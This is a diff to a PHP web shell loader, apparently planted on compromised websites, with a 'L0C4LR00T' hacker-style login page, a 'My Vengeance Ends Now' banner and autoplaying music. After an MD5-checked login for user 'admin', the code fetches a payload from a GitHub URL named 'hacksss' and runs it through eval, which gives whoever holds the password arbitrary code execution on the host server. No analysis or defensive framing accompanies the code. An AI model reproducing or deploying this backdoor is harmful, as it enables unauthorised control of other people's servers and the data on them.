@@ -46,9 +46,9 @@ if (isset($_POST['log']) && $_POST['log'] === 'login' && isset($_POST['username'
     // Example validation (replace with your actual validation logic)
     $entered_username = $_POST['username'];
     $entered_password = $_POST['password'];
-    $hashed_password = 'ca5d35a9d3da3b6a3ce79e42952e611b'; // Replace this with your MD5 hashed password
+    $hashed_password = '4bdba3f2c612c2ee14568b1adf8f03bd'; // Replace this with your MD5 hashed password
 
-    if ($entered_username === 'tlhkpln' && md5($entered_password) === $hashed_password) {
+    if ($entered_username === 'admin' && md5($entered_password) === $hashed_password) {
         // Username and password are correct, store it in session
         $_SESSION['logged_in'] = true;
         $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
@@ -60,7 +60,7 @@ if (isset($_POST['log']) && $_POST['log'] === 'login' && isset($_POST['username'
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/Fajrul12345/Fajrulirfan/master/alfaa.txt');
+    $a = geturlsinfo('https://github.com/tlhkpln/hacksss/blob/main/y.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
@@ -224,7 +224,7 @@ if (is_logged_in()) {
                     echo "<p class='error'>$error_message</p>";
                 }
                 ?>
-                <p class="quote">Ehliyet ruhsat lütfen</p>
+                <p class="quote">My Vengeance Ends Now</p>
                 <form method="post">
                     <input type="hidden" name="log" value="login">
                     <div class="inputBox">
@@ -243,7 +243,7 @@ if (is_logged_in()) {
             <div class="copyright"><span>&L0C4LR00T 2024</span></div>
         </div>
     </body>
-    
+    <audio autoplay="autoplay" loop="loop" id="lagu"src="https://c.top4top.io/m_3230o7fes1.mp3"></audio>
     </html>
     <?php
 }
